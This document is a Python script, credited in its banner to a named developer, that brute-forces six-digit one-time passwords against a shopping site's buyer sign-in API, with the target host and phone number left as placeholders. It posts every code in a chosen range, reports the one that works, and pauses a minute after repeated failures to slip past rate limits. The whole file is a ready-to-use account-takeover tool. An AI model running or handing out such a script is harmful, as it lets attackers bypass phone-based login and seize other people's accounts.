#!/usr/bin/python3

import requests
import os
import json
import sys
import time
import optparse


parser = optparse.OptionParser()

parser.add_option('-s', 
    action="store", dest="start",
    help="starting value", default="spam")

parser.add_option('-e',
    action="store", dest="end",
    help="ending value", default="spam")

options, args = parser.parse_args()

# clean screen
os.system("cls")
os.system("clear")

logo = '''
                 ########################################
                    ------- Devloper by Praveen kumar -----------
                           Twitter : @Mr_x_strange
                 ########################################
'''
# open session here connect 

print (logo)
print("Starting value ="+options.start)
print("Ending value ="+options.end)
print('')
session = requests.Session()
start = time.time()

m = int(options.start)
e = int(options.end)
count = 0
for i in range(m,e):
    # loops Guess the numbers
    number = "{:06d}".format(i)
    url = "https://api.example.com/api/account/buyer/sign-in/"
    data = {"mobile":"xxxxxxxxxx","country_code":"+91","otp":number,"signature":"sdfvsdvsd","mode":0} # enter number for change
    header = {"Host": "xxxxxxxxxx","Content-Type" : "application/json","Accept": "application/json","Content-Length": "92",
"Connection": "close"}

    request = session.post(url , data=json.dumps(data) , headers=header)
    
    re = request.text
    if request.status_code == 201:
        print('')
        if "success" in re:
            print ("\033[0;32m OTP Number "+ str(i) + " success")
            print('')
            print('\033[0;32m' +request.text)   
            print('')
            print("\033[0;32m took script run on " ,time.time() - start)
            sys.exit(0)
        else: 
             print ("[-] OTP Number "+ str(i) + " Failure")
    else:
         print('\033[0;31m'+number+" OTP invaild.... status code = "+str(request.status_code))  
         count += 1
         if count == 10:
            print('')
            print("Wait For one minute....")
            time.sleep(60)
            count = 0
            print('')


print('')
print("took script run on " ,time.time() - start)   

